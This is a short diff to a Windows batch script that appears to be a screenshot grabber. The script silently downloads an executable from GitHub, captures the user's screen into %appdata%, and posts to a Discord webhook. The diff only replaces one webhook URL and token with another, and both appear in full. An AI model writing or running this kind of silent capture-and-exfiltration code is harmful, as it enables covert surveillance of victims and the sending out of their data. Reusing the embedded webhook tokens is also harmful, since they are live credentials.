@@ -1,7 +1,7 @@
 @echo off
 color 0A
 cd %appdata%
-set "webhook=https://discord.com/api/webhooks/989609504809316372/6tDEPjxYwOR7XKm_XtD4QOw3KrkkOBEn7tfvTi6Tq9f4Db9OBg3c7gKacOirILk2g9Ak"
+set "webhook=https://discord.com/api/webhooks/989609504809316372/6tDEPjxYwOR7XKm_XtD4QOw3KrkLk2g9Ak"
 curl --silent -L --fail "https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true" -o s.exe
 .\s.exe -o %appdata%\s.png
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"###################################\"}"  %webhook%
